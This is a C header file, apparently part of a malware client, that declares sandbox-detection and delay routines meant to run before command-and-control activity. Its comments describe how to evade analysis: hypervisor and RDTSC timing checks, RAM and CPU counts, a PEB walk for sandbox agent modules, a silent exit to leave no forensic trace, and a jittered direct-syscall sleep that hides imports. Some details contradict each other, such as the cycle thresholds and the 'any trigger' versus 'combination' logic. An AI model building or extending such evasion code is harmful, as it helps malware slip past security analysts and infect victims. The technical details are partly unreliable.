/*
 * client/evasion/sandbox.h  –  Sandbox / analysis environment detection
 * =======================================================================
 * Provides a single function:
 *
 *   sandbox_check()
 *       Returns TRUE  if the process appears to be running inside an
 *       automated analysis environment (sandbox, AV emulator, debugger).
 *       Returns FALSE if the environment looks like a real user system.
 *
 * Call this at startup before any C2 activity.  If it returns TRUE, the
 * caller should exit silently (not return an error — clean exits leave no
 * forensic traces in sandbox reports).
 *
 * Checks performed (all user-mode, no driver required):
 *
 *   1. CPUID hypervisor bit  — set by VMware, VirtualBox, Hyper-V, KVM.
 *      Most sandboxes run inside a VM.  Bare-metal targets are unaffected.
 *      Real svchost.exe processes do run inside Hyper-V on Windows 11, so
 *      this check is combined with others rather than used alone.
 *
 *   2. RDTSC timing anomaly  — hypervisors add overhead to RDTSC.  Two
 *      RDTSC reads separated by a CPUID serialisation instruction should
 *      differ by < 500 cycles on bare metal; sandboxes typically show
 *      thousands of cycles.  Threshold: 1 000 000 cycles.
 *
 *   3. Physical RAM < 4 GB  — sandbox VMs routinely get 1-2 GB.
 *      Most real workstations have >= 4 GB since ~2012.
 *      Read from PEB->OSPlatformId? No — use GlobalMemoryStatusEx.
 *
 *   4. Number of logical processors < 2  — single-CPU analysis VMs are
 *      common; modern workstations have >= 2 logical cores.
 *
 *   5. Known sandbox process names  — Cuckoo/ANY.RUN/VMRay inject
 *      agent processes with recognisable names.  Walk the LDR list for
 *      known module names before checking the process list.
 *      Checked via PEB walk (no CreateToolhelp32Snapshot / OpenProcess).
 *
 *   6. Execution delay  — sleep 15 + jitter(10) seconds via NtDelayExecution
 *      direct syscall before any network activity.  Most automated sandboxes
 *      have a 30-120 second budget; a 15-25 second sleep consumes a large
 *      fraction without triggering the "immediate sleep" heuristic that some
 *      sandboxes detect.
 *
 * None of these checks is individually reliable; their combination gives
 * a low false-positive rate on real enterprise workstations.
 */

#pragma once
#ifndef CLIENT_SANDBOX_H
#define CLIENT_SANDBOX_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * sandbox_check()
 * ---------------
 * Run all detection heuristics.  Returns TRUE if any trigger fires
 * (abort execution).  Returns FALSE on a clean system.
 */
BOOL sandbox_check(void);

/*
 * sandbox_delay()
 * ---------------
 * Sleep 15 s + uniform jitter [0, 10 s] via NtDelayExecution direct
 * syscall so no Win32 Sleep() import appears in the IAT.
 * Call unconditionally before any network activity regardless of
 * sandbox_check() result.
 */
void sandbox_delay(void);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SANDBOX_H */
